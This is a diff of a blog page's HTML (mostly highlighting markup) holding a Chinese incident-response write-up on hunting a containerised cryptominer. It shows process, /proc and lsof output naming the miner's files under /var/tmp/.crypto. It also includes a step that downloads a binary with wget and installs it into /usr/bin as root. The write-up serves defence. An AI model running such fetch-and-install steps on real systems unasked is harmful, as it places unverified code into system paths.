@@ -175,8 +175,8 @@
         var postToc = $(".post-toc");
         if (postToc.length) {
             var leftPos = $("#main").offset().left;
-            if(leftPos<220){
-                postToc.css({"width":leftPos-10,"margin-left":(0-leftPos)})
+            if (leftPos < 220) {
+                postToc.css({ "width": leftPos - 10, "margin-left": (0 - leftPos) })
             }
 
             var t = postToc.offset().top - 20,
@@ -194,6 +194,10 @@
                 var e = $(window).scrollTop();
                 e < t ? postToc.css(a.start) : postToc.css(a.process)
             })
+        }
+
+        if ($("#TableOfContents").children().length < 1) {
+            $(".post-toc").remove();
         }
     })
 </script>
@@ -238,220 +242,220 @@
 <p>1月26日，运维同学收到告警邮件，告诉我某台测试服务器中了挖矿病毒，心想怎么最近挖矿这么猖狂&hellip;</p>
 <h2 id="1分析准备">1、分析准备</h2>
 <p>仍然下载是busybox</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget https://busybox.net/downloads/binaries/1.30.0-i686/busybox 
-chmod +x busybox
-cp busybox /usr/bin 
-busybox  top
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://busybox.net/downloads/binaries/1.30.0-i686/busybox 
+</span></span><span style="display:flex;"><span>chmod +x busybox
+</span></span><span style="display:flex;"><span>cp busybox /usr/bin 
+</span></span><span style="display:flex;"><span>busybox  top
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="2按步骤排查">2、按步骤排查</h2>
 <p>剩余步骤跟<a href="/post/2021-01-28-miner_virus_2">挖矿病毒2-分析和排查思路</a>一样，只是所有的命令前面是 busybox command<br>
 不过这次是容器挖矿，ECS 排查步骤仍然走一遍，但是没啥收货，但是恶意进程还是可以找到的</p>
 <h2 id="3找到恶意进程">3、找到恶意进程</h2>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># busybox top</span>
-top - 14:14:48 up <span style="color:#099">6</span> days, <span style="color:#099">10</span> min,  <span style="color:#099">1</span> user,  load average: 2.06, 2.32, 2.30
-Tasks: <span style="color:#099">171</span> total,   <span style="color:#099">1</span> running, <span style="color:#099">169</span> sleeping,   <span style="color:#099">0</span> stopped,   <span style="color:#099">1</span> zombie
-%Cpu<span style="color:#000;font-weight:bold">(</span>s<span style="color:#000;font-weight:bold">)</span>: 50.7 us,  0.7 sy,  0.0 ni, 48.7 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
-KiB Mem : <span style="color:#099">16266252</span> total, <span style="color:#099">10225056</span> free,  <span style="color:#099">5006372</span> used,  <span style="color:#099">1034824</span> buff/cache
-KiB Swap:        <span style="color:#099">0</span> total,        <span style="color:#099">0</span> free,        <span style="color:#099">0</span> used. <span style="color:#099">10917736</span> avail Mem 
-  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                          
- <span style="color:#099">4116</span> root      <span style="color:#099">20</span>   <span style="color:#099">0</span> <span style="color:#099">2439464</span>   <span style="color:#099">3272</span>   <span style="color:#099">2132</span> S 200.3  0.0 750:29.39 .ddns
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># busybox top</span>
+</span></span><span style="display:flex;"><span>top - 14:14:48 up <span style="color:#099">6</span> days, <span style="color:#099">10</span> min,  <span style="color:#099">1</span> user,  load average: 2.06, 2.32, 2.30
+</span></span><span style="display:flex;"><span>Tasks: <span style="color:#099">171</span> total,   <span style="color:#099">1</span> running, <span style="color:#099">169</span> sleeping,   <span style="color:#099">0</span> stopped,   <span style="color:#099">1</span> zombie
+</span></span><span style="display:flex;"><span>%Cpu<span style="color:#000;font-weight:bold">(</span>s<span style="color:#000;font-weight:bold">)</span>: 50.7 us,  0.7 sy,  0.0 ni, 48.7 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+</span></span><span style="display:flex;"><span>KiB Mem : <span style="color:#099">16266252</span> total, <span style="color:#099">10225056</span> free,  <span style="color:#099">5006372</span> used,  <span style="color:#099">1034824</span> buff/cache
+</span></span><span style="display:flex;"><span>KiB Swap:        <span style="color:#099">0</span> total,        <span style="color:#099">0</span> free,        <span style="color:#099">0</span> used. <span style="color:#099">10917736</span> avail Mem 
+</span></span><span style="display:flex;"><span>  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                          
+</span></span><span style="display:flex;"><span> <span style="color:#099">4116</span> root      <span style="color:#099">20</span>   <span style="color:#099">0</span> <span style="color:#099">2439464</span>   <span style="color:#099">3272</span>   <span style="color:#099">2132</span> S 200.3  0.0 750:29.39 .ddns
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="4找到程序目录">4、找到程序目录</h2>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># cd /proc/4116</span>
-<span style="color:#000;font-weight:bold">[</span>root@harbor 4116<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># ls -alrt</span>
-total <span style="color:#099">0</span>
-dr-xr-xr-x <span style="color:#099">182</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">20</span> 14:04 ..
--r--r--r--   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 status
--r--r--r--   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 stat
-lrwxrwxrwx   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 cwd -&gt; /var/tmp/.crypto/...
--r--r--r--   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 cgroup
-dr-xr-xr-x   <span style="color:#099">9</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 .
-lrwxrwxrwx   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 exe -&gt; /var/tmp/.crypto/.../.ddns
-
-
-<span style="color:#000;font-weight:bold">[</span>root@harbor admin<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># cd /proc/4115/</span>
-<span style="color:#000;font-weight:bold">[</span>root@harbor 4115<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># ls -alrt</span>
-total <span style="color:#099">0</span>
-dr-xr-xr-x <span style="color:#099">182</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">20</span> 14:04 ..
-lrwxrwxrwx   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 cwd -&gt; /var/tmp/.crypto/...
-dr-xr-xr-x   <span style="color:#099">9</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 .
--r--r--r--   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 status
--r--r--r--   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 stat
-lrwxrwxrwx   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:59 exe -&gt; /var/tmp/.crypto/.../httpd-crypto
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># cd /proc/4116</span>
+</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor 4116<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># ls -alrt</span>
+</span></span><span style="display:flex;"><span>total <span style="color:#099">0</span>
+</span></span><span style="display:flex;"><span>dr-xr-xr-x <span style="color:#099">182</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">20</span> 14:04 ..
+</span></span><span style="display:flex;"><span>-r--r--r--   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 status
+</span></span><span style="display:flex;"><span>-r--r--r--   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 stat
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 cwd -&gt; /var/tmp/.crypto/...
+</span></span><span style="display:flex;"><span>-r--r--r--   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 cgroup
+</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#099">9</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 .
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 exe -&gt; /var/tmp/.crypto/.../.ddns
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor admin<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># cd /proc/4115/</span>
+</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor 4115<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># ls -alrt</span>
+</span></span><span style="display:flex;"><span>total <span style="color:#099">0</span>
+</span></span><span style="display:flex;"><span>dr-xr-xr-x <span style="color:#099">182</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">20</span> 14:04 ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 cwd -&gt; /var/tmp/.crypto/...
+</span></span><span style="display:flex;"><span>dr-xr-xr-x   <span style="color:#099">9</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 .
+</span></span><span style="display:flex;"><span>-r--r--r--   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 status
+</span></span><span style="display:flex;"><span>-r--r--r--   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:58 stat
+</span></span><span style="display:flex;"><span>lrwxrwxrwx   <span style="color:#099">1</span> root root <span style="color:#099">0</span> Jan <span style="color:#099">26</span> 07:59 exe -&gt; /var/tmp/.crypto/.../httpd-crypto
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="5查看进程">5、查看进程</h2>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># busybox lsof -i | grep ddns</span>
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      /var/tmp/.crypto/.../.pid
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      anon_inode:<span style="color:#000;font-weight:bold">[</span>eventpoll<span style="color:#000;font-weight:bold">]</span>
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      pipe:<span style="color:#000;font-weight:bold">[</span>15165876<span style="color:#000;font-weight:bold">]</span>
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      pipe:<span style="color:#000;font-weight:bold">[</span>15165876<span style="color:#000;font-weight:bold">]</span>
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      pipe:<span style="color:#000;font-weight:bold">[</span>15165877<span style="color:#000;font-weight:bold">]</span>
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      pipe:<span style="color:#000;font-weight:bold">[</span>15165877<span style="color:#000;font-weight:bold">]</span>
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      anon_inode:<span style="color:#000;font-weight:bold">[</span>eventfd<span style="color:#000;font-weight:bold">]</span>
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      /var/tmp/.crypto/.../.ddns.log
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      anon_inode:<span style="color:#000;font-weight:bold">[</span>eventfd<span style="color:#000;font-weight:bold">]</span>
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      anon_inode:inotify
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      anon_inode:<span style="color:#000;font-weight:bold">[</span>eventfd<span style="color:#000;font-weight:bold">]</span>
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      /dev/null
-<span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      socket:<span style="color:#000;font-weight:bold">[</span>15167677<span style="color:#000;font-weight:bold">]</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># busybox lsof -i | grep ddns</span>
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      /var/tmp/.crypto/.../.pid
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      anon_inode:<span style="color:#000;font-weight:bold">[</span>eventpoll<span style="color:#000;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      pipe:<span style="color:#000;font-weight:bold">[</span>15165876<span style="color:#000;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      pipe:<span style="color:#000;font-weight:bold">[</span>15165876<span style="color:#000;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      pipe:<span style="color:#000;font-weight:bold">[</span>15165877<span style="color:#000;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      pipe:<span style="color:#000;font-weight:bold">[</span>15165877<span style="color:#000;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      anon_inode:<span style="color:#000;font-weight:bold">[</span>eventfd<span style="color:#000;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      /var/tmp/.crypto/.../.ddns.log
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      anon_inode:<span style="color:#000;font-weight:bold">[</span>eventfd<span style="color:#000;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      anon_inode:inotify
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      anon_inode:<span style="color:#000;font-weight:bold">[</span>eventfd<span style="color:#000;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      /dev/null
+</span></span><span style="display:flex;"><span><span style="color:#099">4116</span>    /var/tmp/.crypto/.../.ddns      socket:<span style="color:#000;font-weight:bold">[</span>15167677<span style="color:#000;font-weight:bold">]</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="6查找程序本体">6、查找程序本体</h2>
 <p>发现并不在 ECS 上，试了下有 docker 命令，就查看下 docker 镜像清单</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
